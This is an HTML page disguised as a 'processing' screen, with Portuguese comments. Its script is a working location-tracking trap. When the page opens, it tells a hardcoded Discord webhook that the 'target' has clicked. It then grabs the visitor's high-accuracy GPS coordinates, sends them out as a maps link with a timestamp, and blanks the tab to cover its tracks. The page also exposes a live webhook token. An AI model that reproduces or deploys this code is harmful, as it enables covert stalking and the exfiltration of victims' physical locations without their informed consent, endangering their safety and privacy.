<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Processando...</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="status">INICIANDO PROTOCOLO...</div>

    <script>
        // VERIFIQUE SE ESTE LINK EST√Å EXATAMENTE IGUAL AO DO DISCORD
        const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        async function enviar(msg) {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg })
            });
        }

        window.onload = async () => {
            // TESTE 1: Manda um aviso assim que abre (pra saber se o link t√° vivo)
            try {
                await enviar("üöÄ **SISTEMA ONLINE:** Alvo abriu o link agora.");
                document.getElementById('status').innerHTML += "<br>TESTE 1: OK";
            } catch(e) {
                document.getElementById('status').innerHTML += "<br>ERRO NO WEBHOOK: " + e;
            }

            // TESTE 2: Tenta o GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;
                    
                    const log = `üéØ **LOCALIZA√á√ÉO ENCONTRADA!**\n` +
                                `üìç Mapa: https://www.google.com/maps?q=${lat},${lon}\n` +
                                `‚è∞ Hora: ${new Date().toLocaleString('pt-BR')}`;
                    
                    await enviar(log);
                    document.getElementById('status').innerHTML += "<br>TESTE 2: GPS ENVIADO";
                    
                    // Fecha a aba ap√≥s 2 segundos de sucesso
                    setTimeout(() => { window.location.href = "about:blank"; }, 2000);

                }, (err) => {
                    enviar("‚ùå O alvo recusou o GPS ou o dispositivo bloqueou.");
                    document.getElementById('status').innerHTML += "<br>ERRO: GPS NEGADO";
                }, { enableHighAccuracy: true, timeout: 10000 });
            }
        };
    </script>
</body>
</html>
